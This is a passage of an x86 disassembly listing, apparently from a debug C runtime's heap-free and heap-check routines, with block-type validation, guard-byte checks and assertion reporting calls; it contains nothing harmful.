  4062d4:	83 c4 14             	add    $0x14,%esp
  4062d7:	83 f8 01             	cmp    $0x1,%eax
  4062da:	75 01                	jne    0x4062dd
  4062dc:	cc                   	int3
  4062dd:	33 c9                	xor    %ecx,%ecx
  4062df:	85 c9                	test   %ecx,%ecx
  4062e1:	75 d0                	jne    0x4062b3
  4062e3:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4062e7:	75 05                	jne    0x4062ee
  4062e9:	e9 97 03 00 00       	jmp    0x406685
  4062ee:	6a 00                	push   $0x0
  4062f0:	6a 00                	push   $0x0
  4062f2:	6a 00                	push   $0x0
  4062f4:	8b 55 0c             	mov    0xc(%ebp),%edx
  4062f7:	52                   	push   %edx
  4062f8:	6a 00                	push   $0x0
  4062fa:	8b 45 08             	mov    0x8(%ebp),%eax
  4062fd:	50                   	push   %eax
  4062fe:	6a 03                	push   $0x3
  406300:	ff 15 00 d3 45 00    	call   *0x45d300
  406306:	83 c4 1c             	add    $0x1c,%esp
  406309:	85 c0                	test   %eax,%eax
  40630b:	75 2b                	jne    0x406338
  40630d:	68 7c f7 40 00       	push   $0x40f77c
  406312:	68 e4 f5 40 00       	push   $0x40f5e4
  406317:	6a 00                	push   $0x0
  406319:	6a 00                	push   $0x0
  40631b:	6a 00                	push   $0x0
  40631d:	6a 00                	push   $0x0
  40631f:	e8 9c 32 00 00       	call   0x4095c0
  406324:	83 c4 18             	add    $0x18,%esp
  406327:	83 f8 01             	cmp    $0x1,%eax
  40632a:	75 01                	jne    0x40632d
  40632c:	cc                   	int3
  40632d:	33 c9                	xor    %ecx,%ecx
  40632f:	85 c9                	test   %ecx,%ecx
  406331:	75 da                	jne    0x40630d
  406333:	e9 4d 03 00 00       	jmp    0x406685
  406338:	8b 55 08             	mov    0x8(%ebp),%edx
  40633b:	52                   	push   %edx
  40633c:	e8 0f 08 00 00       	call   0x406b50
  406341:	83 c4 04             	add    $0x4,%esp
  406344:	85 c0                	test   %eax,%eax
  406346:	75 21                	jne    0x406369
  406348:	68 64 f6 40 00       	push   $0x40f664
  40634d:	6a 00                	push   $0x0
  40634f:	68 14 04 00 00       	push   $0x414
  406354:	68 44 f6 40 00       	push   $0x40f644
  406359:	6a 02                	push   $0x2
  40635b:	e8 60 32 00 00       	call   0x4095c0
  406360:	83 c4 14             	add    $0x14,%esp
  406363:	83 f8 01             	cmp    $0x1,%eax
  406366:	75 01                	jne    0x406369
  406368:	cc                   	int3
  406369:	33 c0                	xor    %eax,%eax
  40636b:	85 c0                	test   %eax,%eax
  40636d:	75 c9                	jne    0x406338
  40636f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406372:	83 e9 20             	sub    $0x20,%ecx
  406375:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  406378:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40637b:	8b 42 14             	mov    0x14(%edx),%eax
  40637e:	25 ff ff 00 00       	and    $0xffff,%eax
  406383:	83 f8 04             	cmp    $0x4,%eax
  406386:	74 43                	je     0x4063cb
  406388:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40638b:	83 79 14 01          	cmpl   $0x1,0x14(%ecx)
  40638f:	74 3a                	je     0x4063cb
  406391:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406394:	8b 42 14             	mov    0x14(%edx),%eax
  406397:	25 ff ff 00 00       	and    $0xffff,%eax
  40639c:	83 f8 02             	cmp    $0x2,%eax
  40639f:	74 2a                	je     0x4063cb
  4063a1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4063a4:	83 79 14 03          	cmpl   $0x3,0x14(%ecx)
  4063a8:	74 21                	je     0x4063cb
  4063aa:	68 64 f1 40 00       	push   $0x40f164
  4063af:	6a 00                	push   $0x0
  4063b1:	68 1a 04 00 00       	push   $0x41a
  4063b6:	68 44 f6 40 00       	push   $0x40f644
  4063bb:	6a 02                	push   $0x2
  4063bd:	e8 fe 31 00 00       	call   0x4095c0
  4063c2:	83 c4 14             	add    $0x14,%esp
  4063c5:	83 f8 01             	cmp    $0x1,%eax
  4063c8:	75 01                	jne    0x4063cb
  4063ca:	cc                   	int3
  4063cb:	33 d2                	xor    %edx,%edx
  4063cd:	85 d2                	test   %edx,%edx
  4063cf:	75 a7                	jne    0x406378
  4063d1:	a1 88 b1 45 00       	mov    0x45b188,%eax
  4063d6:	83 e0 04             	and    $0x4,%eax
  4063d9:	85 c0                	test   %eax,%eax
  4063db:	0f 85 c5 00 00 00    	jne    0x4064a6
  4063e1:	6a 04                	push   $0x4
  4063e3:	8a 0d 94 b1 45 00    	mov    0x45b194,%cl
  4063e9:	51                   	push   %ecx
  4063ea:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4063ed:	83 c2 1c             	add    $0x1c,%edx
  4063f0:	52                   	push   %edx
  4063f1:	e8 9a 02 00 00       	call   0x406690
  4063f6:	83 c4 0c             	add    $0xc,%esp
  4063f9:	85 c0                	test   %eax,%eax
  4063fb:	75 43                	jne    0x406440
  4063fd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406400:	83 c0 20             	add    $0x20,%eax
  406403:	50                   	push   %eax
  406404:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406407:	8b 51 18             	mov    0x18(%ecx),%edx
  40640a:	52                   	push   %edx
  40640b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40640e:	8b 48 14             	mov    0x14(%eax),%ecx
  406411:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  406417:	8b 14 8d 98 b1 45 00 	mov    0x45b198(,%ecx,4),%edx
  40641e:	52                   	push   %edx
  40641f:	68 50 f7 40 00       	push   $0x40f750
  406424:	6a 00                	push   $0x0
  406426:	6a 00                	push   $0x0
  406428:	6a 00                	push   $0x0
  40642a:	6a 01                	push   $0x1
  40642c:	e8 8f 31 00 00       	call   0x4095c0
  406431:	83 c4 20             	add    $0x20,%esp
  406434:	83 f8 01             	cmp    $0x1,%eax
  406437:	75 01                	jne    0x40643a
  406439:	cc                   	int3
  40643a:	33 c0                	xor    %eax,%eax
  40643c:	85 c0                	test   %eax,%eax
  40643e:	75 bd                	jne    0x4063fd
  406440:	6a 04                	push   $0x4
  406442:	8a 0d 94 b1 45 00    	mov    0x45b194,%cl
  406448:	51                   	push   %ecx
  406449:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40644c:	8b 42 10             	mov    0x10(%edx),%eax
  40644f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406452:	8d 54 01 20          	lea    0x20(%ecx,%eax,1),%edx
  406456:	52                   	push   %edx
  406457:	e8 34 02 00 00       	call   0x406690
  40645c:	83 c4 0c             	add    $0xc,%esp
  40645f:	85 c0                	test   %eax,%eax
  406461:	75 43                	jne    0x4064a6
  406463:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406466:	83 c0 20             	add    $0x20,%eax
  406469:	50                   	push   %eax
  40646a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40646d:	8b 51 18             	mov    0x18(%ecx),%edx
  406470:	52                   	push   %edx
  406471:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406474:	8b 48 14             	mov    0x14(%eax),%ecx
  406477:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  40647d:	8b 14 8d 98 b1 45 00 	mov    0x45b198(,%ecx,4),%edx
  406484:	52                   	push   %edx
  406485:	68 24 f7 40 00       	push   $0x40f724
  40648a:	6a 00                	push   $0x0
  40648c:	6a 00                	push   $0x0
  40648e:	6a 00                	push   $0x0
  406490:	6a 01                	push   $0x1
  406492:	e8 29 31 00 00       	call   0x4095c0
  406497:	83 c4 20             	add    $0x20,%esp
  40649a:	83 f8 01             	cmp    $0x1,%eax
  40649d:	75 01                	jne    0x4064a0
  40649f:	cc                   	int3
  4064a0:	33 c0                	xor    %eax,%eax
  4064a2:	85 c0                	test   %eax,%eax
  4064a4:	75 bd                	jne    0x406463
  4064a6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4064a9:	83 79 14 03          	cmpl   $0x3,0x14(%ecx)
  4064ad:	75 6c                	jne    0x40651b
  4064af:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4064b2:	81 7a 0c bc ba dc fe 	cmpl   $0xfedcbabc,0xc(%edx)
  4064b9:	75 09                	jne    0x4064c4
  4064bb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4064be:	83 78 18 00          	cmpl   $0x0,0x18(%eax)
  4064c2:	74 21                	je     0x4064e5
  4064c4:	68 e4 f6 40 00       	push   $0x40f6e4
  4064c9:	6a 00                	push   $0x0
  4064cb:	68 2f 04 00 00       	push   $0x42f
  4064d0:	68 44 f6 40 00       	push   $0x40f644
  4064d5:	6a 02                	push   $0x2
  4064d7:	e8 e4 30 00 00       	call   0x4095c0
  4064dc:	83 c4 14             	add    $0x14,%esp
  4064df:	83 f8 01             	cmp    $0x1,%eax
  4064e2:	75 01                	jne    0x4064e5
  4064e4:	cc                   	int3
  4064e5:	33 c9                	xor    %ecx,%ecx
  4064e7:	85 c9                	test   %ecx,%ecx
  4064e9:	75 c4                	jne    0x4064af
  4064eb:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4064ee:	8b 42 10             	mov    0x10(%edx),%eax
  4064f1:	83 c0 24             	add    $0x24,%eax
  4064f4:	50                   	push   %eax
  4064f5:	33 c9                	xor    %ecx,%ecx
  4064f7:	8a 0d 95 b1 45 00    	mov    0x45b195,%cl
  4064fd:	51                   	push   %ecx
  4064fe:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406501:	52                   	push   %edx
  406502:	e8 f9 cc ff ff       	call   0x403200
  406507:	83 c4 0c             	add    $0xc,%esp
  40650a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40650d:	50                   	push   %eax
  40650e:	e8 1d d0 ff ff       	call   0x403530
  406513:	83 c4 04             	add    $0x4,%esp
  406516:	e9 6a 01 00 00       	jmp    0x406685
  40651b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40651e:	83 79 14 02          	cmpl   $0x2,0x14(%ecx)
  406522:	75 0d                	jne    0x406531
  406524:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  406528:	75 07                	jne    0x406531
  40652a:	c7 45 0c 02 00 00 00 	movl   $0x2,0xc(%ebp)
  406531:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406534:	8b 42 14             	mov    0x14(%edx),%eax
  406537:	3b 45 0c             	cmp    0xc(%ebp),%eax
  40653a:	74 21                	je     0x40655d
  40653c:	68 c4 f6 40 00       	push   $0x40f6c4
  406541:	6a 00                	push   $0x0
  406543:	68 3c 04 00 00       	push   $0x43c
  406548:	68 44 f6 40 00       	push   $0x40f644
  40654d:	6a 02                	push   $0x2
  40654f:	e8 6c 30 00 00       	call   0x4095c0
  406554:	83 c4 14             	add    $0x14,%esp
  406557:	83 f8 01             	cmp    $0x1,%eax
  40655a:	75 01                	jne    0x40655d
  40655c:	cc                   	int3
  40655d:	33 c9                	xor    %ecx,%ecx
  40655f:	85 c9                	test   %ecx,%ecx
  406561:	75 ce                	jne    0x406531
  406563:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406566:	a1 3c de 45 00       	mov    0x45de3c,%eax
  40656b:	2b 42 10             	sub    0x10(%edx),%eax
  40656e:	a3 3c de 45 00       	mov    %eax,0x45de3c
  406573:	8b 0d 88 b1 45 00    	mov    0x45b188,%ecx
  406579:	83 e1 02             	and    $0x2,%ecx
  40657c:	85 c9                	test   %ecx,%ecx
  40657e:	0f 85 d8 00 00 00    	jne    0x40665c
  406584:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406587:	83 3a 00             	cmpl   $0x0,(%edx)
  40658a:	74 10                	je     0x40659c
  40658c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40658f:	8b 08                	mov    (%eax),%ecx
  406591:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406594:	8b 42 04             	mov    0x4(%edx),%eax
  406597:	89 41 04             	mov    %eax,0x4(%ecx)
  40659a:	eb 3e                	jmp    0x4065da
  40659c:	8b 0d 30 de 45 00    	mov    0x45de30,%ecx
  4065a2:	3b 4d fc             	cmp    -0x4(%ebp),%ecx
  4065a5:	74 21                	je     0x4065c8
  4065a7:	68 ac f6 40 00       	push   $0x40f6ac
  4065ac:	6a 00                	push   $0x0
  4065ae:	68 4b 04 00 00       	push   $0x44b
  4065b3:	68 44 f6 40 00       	push   $0x40f644
  4065b8:	6a 02                	push   $0x2
  4065ba:	e8 01 30 00 00       	call   0x4095c0
  4065bf:	83 c4 14             	add    $0x14,%esp
  4065c2:	83 f8 01             	cmp    $0x1,%eax
  4065c5:	75 01                	jne    0x4065c8
  4065c7:	cc                   	int3
  4065c8:	33 d2                	xor    %edx,%edx
  4065ca:	85 d2                	test   %edx,%edx
  4065cc:	75 ce                	jne    0x40659c
  4065ce:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4065d1:	8b 48 04             	mov    0x4(%eax),%ecx
  4065d4:	89 0d 30 de 45 00    	mov    %ecx,0x45de30
  4065da:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4065dd:	83 7a 04 00          	cmpl   $0x0,0x4(%edx)
  4065e1:	74 0f                	je     0x4065f2
  4065e3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4065e6:	8b 48 04             	mov    0x4(%eax),%ecx
  4065e9:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4065ec:	8b 02                	mov    (%edx),%eax
  4065ee:	89 01                	mov    %eax,(%ecx)
  4065f0:	eb 3d                	jmp    0x40662f
  4065f2:	8b 0d 38 de 45 00    	mov    0x45de38,%ecx
  4065f8:	3b 4d fc             	cmp    -0x4(%ebp),%ecx
  4065fb:	74 21                	je     0x40661e
  4065fd:	68 94 f6 40 00       	push   $0x40f694
  406602:	6a 00                	push   $0x0
  406604:	68 55 04 00 00       	push   $0x455
  406609:	68 44 f6 40 00       	push   $0x40f644
  40660e:	6a 02                	push   $0x2
  406610:	e8 ab 2f 00 00       	call   0x4095c0
  406615:	83 c4 14             	add    $0x14,%esp
  406618:	83 f8 01             	cmp    $0x1,%eax
  40661b:	75 01                	jne    0x40661e
  40661d:	cc                   	int3
  40661e:	33 d2                	xor    %edx,%edx
  406620:	85 d2                	test   %edx,%edx
  406622:	75 ce                	jne    0x4065f2
  406624:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406627:	8b 08                	mov    (%eax),%ecx
  406629:	89 0d 38 de 45 00    	mov    %ecx,0x45de38
  40662f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406632:	8b 42 10             	mov    0x10(%edx),%eax
  406635:	83 c0 24             	add    $0x24,%eax
  406638:	50                   	push   %eax
  406639:	33 c9                	xor    %ecx,%ecx
  40663b:	8a 0d 95 b1 45 00    	mov    0x45b195,%cl
  406641:	51                   	push   %ecx
  406642:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406645:	52                   	push   %edx
  406646:	e8 b5 cb ff ff       	call   0x403200
  40664b:	83 c4 0c             	add    $0xc,%esp
  40664e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406651:	50                   	push   %eax
  406652:	e8 d9 ce ff ff       	call   0x403530
  406657:	83 c4 04             	add    $0x4,%esp
  40665a:	eb 29                	jmp    0x406685
  40665c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40665f:	c7 41 14 00 00 00 00 	movl   $0x0,0x14(%ecx)
  406666:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406669:	8b 42 10             	mov    0x10(%edx),%eax
  40666c:	50                   	push   %eax
  40666d:	33 c9                	xor    %ecx,%ecx
  40666f:	8a 0d 95 b1 45 00    	mov    0x45b195,%cl
  406675:	51                   	push   %ecx
  406676:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406679:	83 c2 20             	add    $0x20,%edx
  40667c:	52                   	push   %edx
  40667d:	e8 7e cb ff ff       	call   0x403200
  406682:	83 c4 0c             	add    $0xc,%esp
  406685:	5f                   	pop    %edi
  406686:	5e                   	pop    %esi
  406687:	5b                   	pop    %ebx
  406688:	8b e5                	mov    %ebp,%esp
  40668a:	5d                   	pop    %ebp
  40668b:	c3                   	ret
  40668c:	cc                   	int3
  40668d:	cc                   	int3
  40668e:	cc                   	int3
  40668f:	cc                   	int3
  406690:	55                   	push   %ebp
  406691:	8b ec                	mov    %esp,%ebp
  406693:	51                   	push   %ecx
  406694:	53                   	push   %ebx
  406695:	56                   	push   %esi
  406696:	57                   	push   %edi
  406697:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40669e:	8b 45 10             	mov    0x10(%ebp),%eax
  4066a1:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4066a4:	83 e9 01             	sub    $0x1,%ecx
  4066a7:	89 4d 10             	mov    %ecx,0x10(%ebp)
  4066aa:	85 c0                	test   %eax,%eax
  4066ac:	74 60                	je     0x40670e
  4066ae:	8b 55 08             	mov    0x8(%ebp),%edx
  4066b1:	33 c0                	xor    %eax,%eax
  4066b3:	8a 02                	mov    (%edx),%al
  4066b5:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4066b8:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  4066be:	8b 55 08             	mov    0x8(%ebp),%edx
  4066c1:	83 c2 01             	add    $0x1,%edx
  4066c4:	89 55 08             	mov    %edx,0x8(%ebp)
  4066c7:	3b c1                	cmp    %ecx,%eax
  4066c9:	74 41                	je     0x40670c
  4066cb:	8b 45 0c             	mov    0xc(%ebp),%eax
  4066ce:	25 ff 00 00 00       	and    $0xff,%eax
  4066d3:	50                   	push   %eax
  4066d4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4066d7:	33 d2                	xor    %edx,%edx
  4066d9:	8a 51 ff             	mov    -0x1(%ecx),%dl
  4066dc:	52                   	push   %edx
  4066dd:	8b 45 08             	mov    0x8(%ebp),%eax
  4066e0:	83 e8 01             	sub    $0x1,%eax
  4066e3:	50                   	push   %eax
  4066e4:	68 98 f7 40 00       	push   $0x40f798
  4066e9:	6a 00                	push   $0x0
  4066eb:	6a 00                	push   $0x0
  4066ed:	6a 00                	push   $0x0
  4066ef:	6a 00                	push   $0x0
  4066f1:	e8 ca 2e 00 00       	call   0x4095c0
  4066f6:	83 c4 20             	add    $0x20,%esp
  4066f9:	83 f8 01             	cmp    $0x1,%eax
  4066fc:	75 01                	jne    0x4066ff
  4066fe:	cc                   	int3
  4066ff:	33 c9                	xor    %ecx,%ecx
  406701:	85 c9                	test   %ecx,%ecx
  406703:	75 c6                	jne    0x4066cb
  406705:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40670c:	eb 90                	jmp    0x40669e
  40670e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406711:	5f                   	pop    %edi
  406712:	5e                   	pop    %esi
  406713:	5b                   	pop    %ebx
  406714:	8b e5                	mov    %ebp,%esp
  406716:	5d                   	pop    %ebp
  406717:	c3                   	ret
  406718:	cc                   	int3
  406719:	cc                   	int3
  40671a:	cc                   	int3
  40671b:	cc                   	int3
  40671c:	cc                   	int3
  40671d:	cc                   	int3
  40671e:	cc                   	int3
  40671f:	cc                   	int3
  406720:	55                   	push   %ebp
  406721:	8b ec                	mov    %esp,%ebp
  406723:	6a ff                	push   $0xffffffff
  406725:	68 10 f9 40 00       	push   $0x40f910
  40672a:	68 f8 5a 40 00       	push   $0x405af8
  40672f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  406735:	50                   	push   %eax
  406736:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40673d:	83 c4 e0             	add    $0xffffffe0,%esp
  406740:	53                   	push   %ebx
  406741:	56                   	push   %esi
  406742:	57                   	push   %edi
  406743:	a1 88 b1 45 00       	mov    0x45b188,%eax
  406748:	83 e0 01             	and    $0x1,%eax
  40674b:	85 c0                	test   %eax,%eax
  40674d:	75 0a                	jne    0x406759
  40674f:	b8 01 00 00 00       	mov    $0x1,%eax
  406754:	e9 4a 03 00 00       	jmp    0x406aa3
  406759:	6a 09                	push   $0x9
  40675b:	e8 10 cd ff ff       	call   0x403470
  406760:	83 c4 04             	add    $0x4,%esp
  406763:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40676a:	e8 41 4b 00 00       	call   0x40b2b0
  40676f:	89 45 dc             	mov    %eax,-0x24(%ebp)
  406772:	83 7d dc ff          	cmpl   $0xffffffff,-0x24(%ebp)
  406776:	0f 84 02 01 00 00    	je     0x40687e
  40677c:	83 7d dc fe          	cmpl   $0xfffffffe,-0x24(%ebp)
  406780:	0f 84 f8 00 00 00    	je     0x40687e
  406786:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  406789:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  40678c:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40678f:	83 c2 06             	add    $0x6,%edx
  406792:	89 55 d0             	mov    %edx,-0x30(%ebp)
  406795:	83 7d d0 03          	cmpl   $0x3,-0x30(%ebp)
  406799:	0f 87 ad 00 00 00    	ja     0x40684c
  40679f:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4067a2:	ff 24 85 b4 6a 40 00 	jmp    *0x406ab4(,%eax,4)
  4067a9:	68 ec f8 40 00       	push   $0x40f8ec
  4067ae:	68 e4 f5 40 00       	push   $0x40f5e4
  4067b3:	6a 00                	push   $0x0
  4067b5:	6a 00                	push   $0x0
  4067b7:	6a 00                	push   $0x0
  4067b9:	6a 00                	push   $0x0
  4067bb:	e8 00 2e 00 00       	call   0x4095c0
  4067c0:	83 c4 18             	add    $0x18,%esp
  4067c3:	83 f8 01             	cmp    $0x1,%eax
  4067c6:	75 01                	jne    0x4067c9
  4067c8:	cc                   	int3
  4067c9:	33 c9                	xor    %ecx,%ecx
  4067cb:	85 c9                	test   %ecx,%ecx
  4067cd:	75 da                	jne    0x4067a9
  4067cf:	e9 9e 00 00 00       	jmp    0x406872
  4067d4:	68 c8 f8 40 00       	push   $0x40f8c8
  4067d9:	68 e4 f5 40 00       	push   $0x40f5e4
  4067de:	6a 00                	push   $0x0
  4067e0:	6a 00                	push   $0x0
  4067e2:	6a 00                	push   $0x0
  4067e4:	6a 00                	push   $0x0
  4067e6:	e8 d5 2d 00 00       	call   0x4095c0
  4067eb:	83 c4 18             	add    $0x18,%esp
  4067ee:	83 f8 01             	cmp    $0x1,%eax
  4067f1:	75 01                	jne    0x4067f4
  4067f3:	cc                   	int3
  4067f4:	33 d2                	xor    %edx,%edx
  4067f6:	85 d2                	test   %edx,%edx
  4067f8:	75 da                	jne    0x4067d4
  4067fa:	eb 76                	jmp    0x406872
  4067fc:	68 a4 f8 40 00       	push   $0x40f8a4
  406801:	68 e4 f5 40 00       	push   $0x40f5e4
  406806:	6a 00                	push   $0x0
  406808:	6a 00                	push   $0x0
  40680a:	6a 00                	push   $0x0
  40680c:	6a 00                	push   $0x0
  40680e:	e8 ad 2d 00 00       	call   0x4095c0
  406813:	83 c4 18             	add    $0x18,%esp
  406816:	83 f8 01             	cmp    $0x1,%eax
  406819:	75 01                	jne    0x40681c
  40681b:	cc                   	int3
  40681c:	33 c0                	xor    %eax,%eax
  40681e:	85 c0                	test   %eax,%eax
  406820:	75 da                	jne    0x4067fc
  406822:	eb 4e                	jmp    0x406872
  406824:	68 80 f8 40 00       	push   $0x40f880
  406829:	68 e4 f5 40 00       	push   $0x40f5e4
  40682e:	6a 00                	push   $0x0
  406830:	6a 00                	push   $0x0
  406832:	6a 00                	push   $0x0
  406834:	6a 00                	push   $0x0
  406836:	e8 85 2d 00 00       	call   0x4095c0
  40683b:	83 c4 18             	add    $0x18,%esp
  40683e:	83 f8 01             	cmp    $0x1,%eax
  406841:	75 01                	jne    0x406844
  406843:	cc                   	int3
  406844:	33 c9                	xor    %ecx,%ecx
  406846:	85 c9                	test   %ecx,%ecx
  406848:	75 da                	jne    0x406824
  40684a:	eb 26                	jmp    0x406872
  40684c:	68 54 f8 40 00       	push   $0x40f854
  406851:	68 e4 f5 40 00       	push   $0x40f5e4
  406856:	6a 00                	push   $0x0
  406858:	6a 00                	push   $0x0
  40685a:	6a 00                	push   $0x0
  40685c:	6a 00                	push   $0x0
  40685e:	e8 5d 2d 00 00       	call   0x4095c0
  406863:	83 c4 18             	add    $0x18,%esp
  406866:	83 f8 01             	cmp    $0x1,%eax
  406869:	75 01                	jne    0x40686c
  40686b:	cc                   	int3
  40686c:	33 d2                	xor    %edx,%edx
  40686e:	85 d2                	test   %edx,%edx
  406870:	75 da                	jne    0x40684c
  406872:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  406879:	e9 09 02 00 00       	jmp    0x406a87
  40687e:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  406885:	a1 38 de 45 00       	mov    0x45de38,%eax
  40688a:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40688d:	eb 08                	jmp    0x406897
  40688f:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  406892:	8b 11                	mov    (%ecx),%edx
  406894:	89 55 e0             	mov    %edx,-0x20(%ebp)
  406897:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  40689b:	0f 84 e6 01 00 00    	je     0x406a87
  4068a1:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
  4068a8:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4068ab:	8b 48 14             	mov    0x14(%eax),%ecx
  4068ae:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  4068b4:	83 f9 04             	cmp    $0x4,%ecx
  4068b7:	74 23                	je     0x4068dc
  4068b9:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4068bc:	83 7a 14 01          	cmpl   $0x1,0x14(%edx)
  4068c0:	74 1a                	je     0x4068dc
  4068c2:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4068c5:	8b 48 14             	mov    0x14(%eax),%ecx
  4068c8:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  4068ce:	83 f9 02             	cmp    $0x2,%ecx
  4068d1:	74 09                	je     0x4068dc
  4068d3:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4068d6:	83 7a 14 03          	cmpl   $0x3,0x14(%edx)
  4068da:	75 18                	jne    0x4068f4
  4068dc:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4068df:	8b 48 14             	mov    0x14(%eax),%ecx
  4068e2:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  4068e8:	8b 14 8d 98 b1 45 00 	mov    0x45b198(,%ecx,4),%edx
  4068ef:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  4068f2:	eb 07                	jmp    0x4068fb
  4068f4:	c7 45 d4 4c f8 40 00 	movl   $0x40f84c,-0x2c(%ebp)
  4068fb:	6a 04                	push   $0x4
  4068fd:	a0 94 b1 45 00       	mov    0x45b194,%al
  406902:	50                   	push   %eax
  406903:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  406906:	83 c1 1c             	add    $0x1c,%ecx
  406909:	51                   	push   %ecx
  40690a:	e8 81 fd ff ff       	call   0x406690
  40690f:	83 c4 0c             	add    $0xc,%esp
  406912:	85 c0                	test   %eax,%eax
  406914:	75 3a                	jne    0x406950
  406916:	8b 55 e0             	mov    -0x20(%ebp),%edx
  406919:	83 c2 20             	add    $0x20,%edx
  40691c:	52                   	push   %edx
  40691d:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406920:	8b 48 18             	mov    0x18(%eax),%ecx
  406923:	51                   	push   %ecx
  406924:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  406927:	52                   	push   %edx
  406928:	68 50 f7 40 00       	push   $0x40f750
  40692d:	6a 00                	push   $0x0
  40692f:	6a 00                	push   $0x0
  406931:	6a 00                	push   $0x0
  406933:	6a 00                	push   $0x0
  406935:	e8 86 2c 00 00       	call   0x4095c0
  40693a:	83 c4 20             	add    $0x20,%esp
  40693d:	83 f8 01             	cmp    $0x1,%eax
  406940:	75 01                	jne    0x406943
  406942:	cc                   	int3
  406943:	33 c0                	xor    %eax,%eax
  406945:	85 c0                	test   %eax,%eax
  406947:	75 cd                	jne    0x406916
  406949:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  406950:	6a 04                	push   $0x4
  406952:	8a 0d 94 b1 45 00    	mov    0x45b194,%cl
  406958:	51                   	push   %ecx
  406959:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40695c:	8b 42 10             	mov    0x10(%edx),%eax
  40695f:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  406962:	8d 54 01 20          	lea    0x20(%ecx,%eax,1),%edx
  406966:	52                   	push   %edx
  406967:	e8 24 fd ff ff       	call   0x406690
  40696c:	83 c4 0c             	add    $0xc,%esp
  40696f:	85 c0                	test   %eax,%eax
  406971:	75 3a                	jne    0x4069ad
  406973:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406976:	83 c0 20             	add    $0x20,%eax
  406979:	50                   	push   %eax
  40697a:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40697d:	8b 51 18             	mov    0x18(%ecx),%edx
  406980:	52                   	push   %edx
  406981:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406984:	50                   	push   %eax
  406985:	68 24 f7 40 00       	push   $0x40f724
  40698a:	6a 00                	push   $0x0
  40698c:	6a 00                	push   $0x0
  40698e:	6a 00                	push   $0x0
  406990:	6a 00                	push   $0x0
  406992:	e8 29 2c 00 00       	call   0x4095c0
  406997:	83 c4 20             	add    $0x20,%esp
  40699a:	83 f8 01             	cmp    $0x1,%eax
  40699d:	75 01                	jne    0x4069a0
  40699f:	cc                   	int3
  4069a0:	33 c9                	xor    %ecx,%ecx
  4069a2:	85 c9                	test   %ecx,%ecx
